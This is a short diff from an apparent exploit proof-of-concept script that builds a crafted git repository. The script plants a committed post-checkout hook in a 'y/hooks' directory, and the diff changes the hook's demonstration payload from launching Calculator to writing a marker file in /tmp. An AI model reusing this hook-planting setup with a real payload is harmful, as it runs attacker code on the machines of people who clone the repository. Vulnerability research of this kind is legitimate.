@@ -20,7 +20,7 @@ setup_HULK_REPO() {
 	# Create necessary directories and set up the post-checkout hook
 	mkdir -p y/hooks
 	cp ./.git/hooks/post-update.sample y/hooks/post-checkout # so u won't get the hook ignored
-	echo "/System/Applications/Calculator.app/Contents/MacOS/Calculator" > y/hooks/post-checkout
+	echo "echo 'xxxx' > /tmp/xxx" > y/hooks/post-checkout
 
 	# Add and commit the post-checkout hook
 	git add y/hooks/post-checkout
